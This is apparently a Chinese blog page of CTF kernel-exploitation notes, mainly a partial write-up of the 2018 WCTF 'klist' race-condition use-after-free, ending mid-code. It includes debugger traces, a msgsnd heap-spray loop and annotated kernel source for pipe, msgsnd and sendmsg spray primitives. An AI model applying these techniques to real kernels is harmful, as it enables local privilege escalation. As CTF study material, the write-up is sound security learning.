<h1 id="20190CTF-FINAL-Fast-amp-Furious"><a href="#20190CTF-FINAL-Fast-amp-Furious" class="headerlink" title="20190CTF-FINAL_Fast&amp;Furious"></a>20190CTF-FINAL_Fast&amp;Furious</h1><h1 id="20190CTF-FINAL-Fast-amp-Furious2"><a href="#20190CTF-FINAL-Fast-amp-Furious2" class="headerlink" title="20190CTF-FINAL_Fast&amp;Furious2"></a>20190CTF-FINAL_Fast&amp;Furious2</h1><h1 id="2019N1CTF-babykernel"><a href="#2019N1CTF-babykernel" class="headerlink" title="2019N1CTF_babykernel"></a>2019N1CTF_babykernel</h1><h1 id="2019Hack-lu-babykernel2"><a href="#2019Hack-lu-babykernel2" class="headerlink" title="2019Hack.lu_babykernel2"></a>2019Hack.lu_babykernel2</h1><h1 id="2019TeaserCONFidence-p4fmt"><a href="#2019TeaserCONFidence-p4fmt" class="headerlink" title="2019TeaserCONFidence_p4fmt"></a>2019TeaserCONFidence_p4fmt</h1><p><a href="http://brieflyx.me/2019/ctf-writeups/p4teaser-2019-p4fmt/" target="_blank" rel="noopener">http://brieflyx.me/2019/ctf-writeups/p4teaser-2019-p4fmt/</a></p>
<p><a href="https://xz.aliyun.com/t/4574" target="_blank" rel="noopener">https://xz.aliyun.com/t/4574</a></p>
<h1 id="20170CTF-knote"><a href="#20170CTF-knote" class="headerlink" title="20170CTF_knote"></a>20170CTF_knote</h1><h1 id="20180CTF-zerofs"><a href="#20180CTF-zerofs" class="headerlink" title="20180CTF_zerofs"></a>20180CTF_zerofs</h1><h1 id="2018WCTF-klist"><a href="#2018WCTF-klist" class="headerlink" title="2018WCTF_klist"></a>2018WCTF_klist</h1><h2 id="思路：-7"><a href="#思路：-7" class="headerlink" title="思路："></a>思路：</h2><p>又是一道关于竞争的题目，准备总结一下关于竞争的一些东西。。。</p>
<p>我个人觉得竞争的题目最难的地方在于<strong>如何用用户态的程序稳定的触发竞争漏洞</strong>，并使程序可以继续运行下去，不会崩掉，还有就是调试比较麻烦。。。</p>
<p>这道题的漏洞点是在<code>list_head</code>中的<code>puts</code>操作放在了锁的外面，且是直接对<code>glist</code>这个全局变量进行的操作(前面的都是对栈上的原始变量进行的操作)，所以会导致竞争<code>add</code>，在<code>puts</code>前更新<code>glist</code>，获取一个悬垂指针。</p>
<p>好像不同的线程/进程申请相同大小<code>size</code>的chunk会从不同的<code>slab</code>中取，因为是不同的<code>cpu_slab</code>吧应该，毕竟是多核。</p>
<p>之后的问题就是怎么在用户态中通过调用函数来控制这个<code>UAF</code>的chunk，这里用的是<code>pipe</code>函数，在其<code>alloc_pipe_info</code>函数内部会申请<code>0x280</code>的chunk作为<code>pipe</code>的一个结构体貌似，然后用<code>write</code>可使<code>size</code>位置不断增大，一次就足够了。</p>
<p>需要提一下的是通用堆喷技术(<code>userfaultfd</code>+<code>setxattr</code>)在这里是无法使用的，因为内核并不支持<code>userfaultfd</code>系统调用，应该是编译时并没有开启<code>CONFIG_USERFAULTFD</code>吧。</p>
<p>还有就是好像第三次<code>free</code>目标chunk时，好像被放到了另外一个<code>slab</code>中，如果不是的话<code>next_ptr</code>应该一直指向自己，因为前面已经<code>double free</code>了。</p>
<p><img src="https://i.loli.net/2020/04/21/617PymFw4lkr2Bn.png" alt="t1.PNG"></p>
<h2 id="关于堆喷："><a href="#关于堆喷：" class="headerlink" title="关于堆喷："></a>关于堆喷：</h2><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>跟到<code>alloc_pipe_info</code>函数内部看了一下，发现有一个<code>__kmalloc(0x280)</code>的地方，且其返回的指针确实为我们的悬垂指针。</p>
<p>需要注意的是只能申请<code>0x280</code>，且内容不可控。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">  _  ___     ___ ____ _____  </span><br><span class="line"> | |/ / |   |_ _/ ___|_   _| </span><br><span class="line"> | <span class="string">' /| |    | |\___ \ | |   </span></span><br><span class="line"><span class="string"> | . \| |___ | | ___) || |   </span></span><br><span class="line"><span class="string"> |_|\_\_____|___|____/ |_|   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/ # cat /proc/kallsyms | grep ffffffff81188870</span></span><br><span class="line"><span class="string">ffffffff81188870 T kmem_cache_alloc_trace</span></span><br><span class="line"><span class="string">/ # cat /proc/kallsyms | grep ffffffff81188d00</span></span><br><span class="line"><span class="string">ffffffff81188d00 T __kmalloc</span></span><br><span class="line"><span class="string">/ # cat /proc/kallsyms | grep ffffffff8108ee60</span></span><br><span class="line"><span class="string">ffffffff8108ee60 T __init_waitqueue_head</span></span><br><span class="line"><span class="string">/ # cat /proc/kallsyms | grep ffffffff81093260</span></span><br><span class="line"><span class="string">ffffffff81093260 T __mutex_init</span></span><br><span class="line"><span class="string">/ # </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RAX: 0xffff88007a056e40 --&gt; 0x3e800000002 </span></span><br><span class="line"><span class="string">RBX: 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RCX: 0x1 </span></span><br><span class="line"><span class="string">RDX: 0x88 </span></span><br><span class="line"><span class="string">RSI: 0x15080c0 </span></span><br><span class="line"><span class="string">RDI: 0xffff88007cc01800 --&gt; 0x23b20 </span></span><br><span class="line"><span class="string">RBP: 0xffffc90000b8fed8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RIP: 0xffffffff811a37da --&gt; 0xc08548fffe5091e8 </span></span><br><span class="line"><span class="string">R8 : 0xffff88007f624ae0 --&gt; 0xffff88007b354618 --&gt; 0xffff88007b354640 --&gt; 0xffff88007b354668 --&gt; 0xffff88007b354690 --&gt; 0xffff88007b3546b8 (--&gt; ...)</span></span><br><span class="line"><span class="string">R9 : 0x0 </span></span><br><span class="line"><span class="string">R10: 0xffff88007b3545f0 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">R11: 0x0 </span></span><br><span class="line"><span class="string">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="string">R13: 0x100000 </span></span><br><span class="line"><span class="string">R14: 0x0 </span></span><br><span class="line"><span class="string">R15: 0x0</span></span><br><span class="line"><span class="string">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="string">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="string">   0xffffffff811a37c9:	mov    edx,0x88</span></span><br><span class="line"><span class="string">   0xffffffff811a37ce:	mov    esi,0x15080c0</span></span><br><span class="line"><span class="string">   0xffffffff811a37d3:	mov    r13d,DWORD PTR [rip+0x10bf026]        # 0xffffffff82262800</span></span><br><span class="line"><span class="string">=&gt; 0xffffffff811a37da:	call   0xffffffff81188870      #kmem_cache_alloc_trace</span></span><br><span class="line"><span class="string">   0xffffffff811a37df:	test   rax,rax</span></span><br><span class="line"><span class="string">   0xffffffff811a37e2:	je     0xffffffff811a3910</span></span><br><span class="line"><span class="string">   0xffffffff811a37e8:	cmp    r13d,0xffff</span></span><br><span class="line"><span class="string">   0xffffffff811a37ef:	mov    rbx,rax</span></span><br><span class="line"><span class="string">Guessed arguments:</span></span><br><span class="line"><span class="string">arg[0]: 0xffff88007cc01800 --&gt; 0x23b20 </span></span><br><span class="line"><span class="string">arg[1]: 0x15080c0 </span></span><br><span class="line"><span class="string">arg[2]: 0x88 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RAX: 0x0 </span></span><br><span class="line"><span class="string">RBX: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RCX: 0x0 </span></span><br><span class="line"><span class="string">RDX: 0x0 </span></span><br><span class="line"><span class="string">RSI: 0x15080c0 </span></span><br><span class="line"><span class="string">RDI: 0x280 </span></span><br><span class="line"><span class="string">RBP: 0x10 </span></span><br><span class="line"><span class="string">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RIP: 0xffffffff811a3851 --&gt; 0xc08548fffe54aae8 </span></span><br><span class="line"><span class="string">R8 : 0xffff88007f623b20 --&gt; 0xffff88007b3c8840 --&gt; 0xffff88007b3c8900 --&gt; 0xffff88007b3c89c0 --&gt; 0xffff88007b3c8a80 --&gt; 0xffff88007b3c8b40 (--&gt; ...)</span></span><br><span class="line"><span class="string">R9 : 0x0 </span></span><br><span class="line"><span class="string">R10: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="string">R11: 0x0 </span></span><br><span class="line"><span class="string">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="string">R13: 0x10 </span></span><br><span class="line"><span class="string">R14: 0x0 </span></span><br><span class="line"><span class="string">R15: 0x0</span></span><br><span class="line"><span class="string">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="string">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="string">   0xffffffff811a3843:	lea    rdi,[r13+r13*4+0x0]</span></span><br><span class="line"><span class="string">   0xffffffff811a3848:	mov    esi,0x15080c0</span></span><br><span class="line"><span class="string">   0xffffffff811a384d:	shl    rdi,0x3</span></span><br><span class="line"><span class="string">=&gt; 0xffffffff811a3851:	call   0xffffffff81188d00   #__kmalloc</span></span><br><span class="line"><span class="string">   0xffffffff811a3856:	test   rax,rax</span></span><br><span class="line"><span class="string">   0xffffffff811a3859:	mov    QWORD PTR [rbx+0x78],rax</span></span><br><span class="line"><span class="string">   0xffffffff811a385d:	je     0xffffffff811a38fe</span></span><br><span class="line"><span class="string">   0xffffffff811a3863:	lea    rdi,[rbx+0x20]</span></span><br><span class="line"><span class="string">Guessed arguments:</span></span><br><span class="line"><span class="string">arg[0]: 0x280 </span></span><br><span class="line"><span class="string">arg[1]: 0x15080c0 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RAX: 0xffff88007ace8c00 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RBX: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RCX: 0x0 </span></span><br><span class="line"><span class="string">RDX: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RSI: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")</span></span><br><span class="line"><span class="string">RDI: 0xffff88007b3c87a0 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RBP: 0x10 </span></span><br><span class="line"><span class="string">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RIP: 0xffffffff811a3875 --&gt; 0x1b848ffeeb5e6e8 </span></span><br><span class="line"><span class="string">R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)</span></span><br><span class="line"><span class="string">R9 : 0x0 </span></span><br><span class="line"><span class="string">R10: 0xffff88007ace8c00 --&gt; 0x0 </span></span><br><span class="line"><span class="string">R11: 0x0 </span></span><br><span class="line"><span class="string">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="string">R13: 0x10 </span></span><br><span class="line"><span class="string">R14: 0x0 </span></span><br><span class="line"><span class="string">R15: 0x0</span></span><br><span class="line"><span class="string">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="string">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="string">   0xffffffff811a3863:	lea    rdi,[rbx+0x20]</span></span><br><span class="line"><span class="string">   0xffffffff811a3867:	mov    rdx,0xffffffff828e9558</span></span><br><span class="line"><span class="string">   0xffffffff811a386e:	mov    rsi,0xffffffff81ff2684</span></span><br><span class="line"><span class="string">=&gt; 0xffffffff811a3875:	call   0xffffffff8108ee60     #__init_waitqueue_head</span></span><br><span class="line"><span class="string">   0xffffffff811a387a:	movabs rax,0x100000001</span></span><br><span class="line"><span class="string">   0xffffffff811a3884:	mov    DWORD PTR [rbx+0x40],r13d</span></span><br><span class="line"><span class="string">   0xffffffff811a3888:	mov    QWORD PTR [rbx+0x80],r12</span></span><br><span class="line"><span class="string">   0xffffffff811a388f:	mov    QWORD PTR [rbx+0x54],rax</span></span><br><span class="line"><span class="string">Guessed arguments:</span></span><br><span class="line"><span class="string">arg[0]: 0xffff88007b3c87a0 --&gt; 0x0 </span></span><br><span class="line"><span class="string">arg[1]: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")</span></span><br><span class="line"><span class="string">arg[2]: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RAX: 0x100000001 </span></span><br><span class="line"><span class="string">RBX: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RCX: 0x0 </span></span><br><span class="line"><span class="string">RDX: 0xffffffff828e9558 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RSI: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")</span></span><br><span class="line"><span class="string">RDI: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RBP: 0x10 </span></span><br><span class="line"><span class="string">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="string">RIP: 0xffffffff811a38a4 --&gt; 0xd88948ffeef9b7e8 </span></span><br><span class="line"><span class="string">R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)</span></span><br><span class="line"><span class="string">R9 : 0x0 </span></span><br><span class="line"><span class="string">R10: 0xffff88007ace8c00 --&gt; 0x0 </span></span><br><span class="line"><span class="string">R11: 0x0 </span></span><br><span class="line"><span class="string">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="string">R13: 0x10 </span></span><br><span class="line"><span class="string">R14: 0x0 </span></span><br><span class="line"><span class="string">R15: 0x0</span></span><br><span class="line"><span class="string">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span></span><br><span class="line"><span class="string">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="string">   0xffffffff811a3893:	mov    rdi,rbx</span></span><br><span class="line"><span class="string">   0xffffffff811a3896:	mov    rdx,0xffffffff828e9558</span></span><br><span class="line"><span class="string">   0xffffffff811a389d:	mov    rsi,0xffffffff81ff2690</span></span><br><span class="line"><span class="string">=&gt; 0xffffffff811a38a4:	call   0xffffffff81093260    #__mutex_init</span></span><br><span class="line"><span class="string">   0xffffffff811a38a9:	mov    rax,rbx</span></span><br><span class="line"><span class="string">   0xffffffff811a38ac:	pop    rbx</span></span><br><span class="line"><span class="string">   0xffffffff811a38ad:	pop    rbp</span></span><br><span class="line"><span class="string">   0xffffffff811a38ae:	pop    r12</span></span><br><span class="line"><span class="string">Guessed arguments:</span></span><br><span class="line"><span class="string">arg[0]: 0xffff88007b3c8780 --&gt; 0x0 </span></span><br><span class="line"><span class="string">arg[1]: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")</span></span><br><span class="line"><span class="string">arg[2]: 0xffffffff828e9558 --&gt; 0x0</span></span><br></pre></td></tr></table></figure>
<h3 id="msgsnd"><a href="#msgsnd" class="headerlink" title="msgsnd"></a>msgsnd</h3><p>我也跟了一下，是可行的，<strong>需要注意的是前<code>0x30</code>字节不可控</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只能控制0x30字节以后的内容</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[BUFF_SIZE<span class="number">-0x30</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"><span class="built_in">memset</span>(msg.mtext,<span class="number">0x42</span>,BUFF_SIZE<span class="number">-0x30</span><span class="number">-1</span>); <span class="comment">// 布置用户空间的内容</span></span><br><span class="line">msg.mtext[BUFF_SIZE<span class="number">-0x30</span>] = <span class="number">0</span>;</span><br><span class="line">msg.mtype = <span class="number">1</span>; <span class="comment">//必须 &gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> msqid = msgget(IPC_PRIVATE,<span class="number">0644</span>|IPC_CREAT);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">120</span>; i++)</span><br><span class="line">  msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ipc/msg.c</span></span><br><span class="line">SYSCALL_DEFINE4(msgsnd, <span class="keyword">int</span>, msqid, struct msgbuf __user *, msgp, <span class="keyword">size_t</span>, msgsz,</span><br><span class="line">        <span class="keyword">int</span>, msgflg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ksys_msgsnd(msqid, msgp, msgsz, msgflg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">    ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  msg = load_msg(mtext, msgsz);  <span class="comment">// 调用load_msg</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// /ipc/msgutil.c</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">    <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    msg = alloc_msg(len);  <span class="comment">// alloc_msg</span></span><br><span class="line">    <span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    alen = min(len, DATALEN_MSG); <span class="comment">// DATALEN_MSG</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen)) <span class="comment">// copy1</span></span><br><span class="line">        <span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">        len -= alen;</span><br><span class="line">        src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">        alen = min(len, DATALEN_SEG);</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen)) <span class="comment">// copy2</span></span><br><span class="line">            <span class="keyword">goto</span> out_err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = security_msg_msg_alloc(msg);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">    free_msg(msg);</span><br><span class="line">    <span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG ((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    alen = min(len, DATALEN_MSG);</span><br><span class="line">    msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT); <span class="comment">// 先分配了一个msg_msg结构大小</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd() ---&gt; ksys_msgsnd() ---&gt; do_msgsnd() ---&gt; load_msg(用cat /proc/kallsyms | grep load_msg)</span><br></pre></td></tr></table></figure>
<h3 id="sendmsg"><a href="#sendmsg" class="headerlink" title="sendmsg"></a>sendmsg</h3><p>同样跟着调了一下，是可以成功的，需要注意的是<strong><code>size</code>必须大于<code>44</code>，但是内容是全部可控的</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//限制: BUFF_SIZE &gt; 44</span></span><br><span class="line"><span class="keyword">char</span> buff[BUFF_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> = 